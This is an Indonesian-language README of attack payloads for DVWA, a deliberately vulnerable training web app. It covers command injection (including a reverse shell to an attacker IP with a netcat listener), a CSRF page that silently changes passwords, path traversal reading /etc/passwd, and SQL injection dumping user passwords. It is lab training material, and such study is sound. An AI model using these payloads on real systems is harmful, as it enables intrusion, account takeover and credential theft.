# DVWA Tricks
Damn Vulnerable Web Application (DVWA) adalah aplikasi web berbasis PHP/MySQL yang sangat rentan. Tujuan utamanya adalah untuk menjadi bantuan bagi para profesional keamanan untuk menguji skill dan tools di lingkungan yang legal, membantu developer web lebih memahami proses mengamankan aplikasi web dan membantu siswa & guru untuk belajar tentang keamanan aplikasi web di platform yang sudah disediakan.

Informasi Download dan instalasi: https://github.com/digininja/DVWA

## Command Injection
Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.

### Security Low
```sh
127.0.0.1; ls
``` 
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%201.JPG)

```sh
127.0.0.1; whoami; hostname
```
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)

Menjalankan Reverse Shell di Server
```sh
127.0.0.1; ncat <IP_Attacker> 9999 -e /bin/bash
```

Listener
```sh
nc -lnvp 9999
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%208.JPG)


### Security Medium
```sh
127.0.0.1& ls
```
```sh
127.0.0.1& whoami& hostname
```

### Security Hard
Di level ini kita hanya bisa mengeksekusi 1 perintah saja
```sh
127.0.0.1|ls
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)

## CSRF
Cross-site request forgery atau Pemalsuan permintaan lintas situs adalah celah keamanan web yang memungkinkan penyerang membujuk pengguna untuk melakukan tindakan yang tidak ingin mereka lakukan.

### Security Low
Mengganti password pengguna menjadi **test** lewat link
```sh
http://<IP_Server>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
```

Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). Silahkan Edit dan simpan kode dibawah ini dengan **nama_file.html**
```sh
<html>
    <body>
        <form action="http://<IP_Server>/DVWA/vulnerabilities/csrf" method="GET">
            <input type="hidden" name="password_new" value="test123" />
            <input type="hidden" name="password_conf" value="test123" />
            <input type="hidden" name="Change" value="Change" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%204.JPG)

## File Inclusion
File Inclusion Attack adalah jenis celah keamanan web yang memungkinkan penyerang mengakses file sensitif di server atau memungkinkan mereka untuk menjalankan file berbahaya di server mereka.

### Security Low
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file4.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%205.JPG)

```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%206.JPG)

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%207.JPG)

### Security Medium
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```

### Security High
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
```

## SQL Injection
SQL Injection (SQLi) adalah celah keamanan web yang memungkinkan penyerang mengintruksi query yang dibuat aplikasi untuk melihat data yang biasanya tidak dapat mereka ambil, misalnya data pengguna lain atau data lain apapun yang dapat diakses oleh aplikasi itu sendiri

### Security Low
Tambahkan spasi setelah **--**
```sh
a' UNION SELECT user, password FROM users -- 
```

```sh
q' UNION SELECT user, password FROM users #
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%209.JPG)

Referensi: https://portswigger.net/web-security/learning-path